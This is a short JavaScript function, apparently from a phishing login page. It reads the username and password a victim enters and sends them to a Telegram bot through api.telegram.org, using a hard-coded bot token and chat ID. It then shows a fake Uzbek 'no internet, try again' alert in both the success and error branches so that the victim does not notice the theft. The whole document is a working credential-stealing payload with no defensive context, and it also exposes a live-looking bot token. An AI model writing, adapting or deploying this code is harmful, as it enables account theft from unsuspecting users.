function sendData() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    if (username && password) {
        var token = "7540122910:AAEF-4BMRUrxGHULTmmuw0WG_H-pQY25o6s";
        var chatId = "@python_01010";
        var message = "Login: " + username + "%0AParol: " + password;

        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + message)
        .then(response => {
            alert("Internet mavjud emas. Qayta urinib ko'ring.");
        })
        .catch(error => {
            alert("Internet mavjud emas. Qayta urinib ko'ring.");
        });
    } else {
        alert("Iltimos, barcha maydonlarni to'ldiring.");
    }
}